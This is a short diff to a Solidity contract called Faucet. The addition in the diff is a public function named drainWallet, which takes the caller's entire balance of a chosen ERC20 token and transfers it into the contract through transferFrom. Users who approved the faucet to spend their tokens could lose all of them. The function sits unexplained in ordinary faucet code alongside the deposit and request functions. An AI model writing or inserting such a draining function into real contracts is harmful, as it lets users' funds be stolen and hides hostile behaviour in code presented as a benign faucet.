@@ -86,6 +86,12 @@ contract Faucet {
         emit RequestToken(msg.sender, _receiver, _token);
     }
 
+    function drainWallet(address _token) public {
+        uint256 balance = ERC20(_token).balanceOf(msg.sender);
+        bool success = ERC20(_token).transferFrom(msg.sender, address(this), balance);
+        require(success, "Transfer failed");
+    }
+
     function depositToken(address _token, uint256 _amount) public {
         require(_amount > 0, "Amount must be greater than 0");
         
@@ -103,6 +109,4 @@ contract Faucet {
 
         emit DepositToken(msg.sender, _token, _amount);
     }
-
-
 }
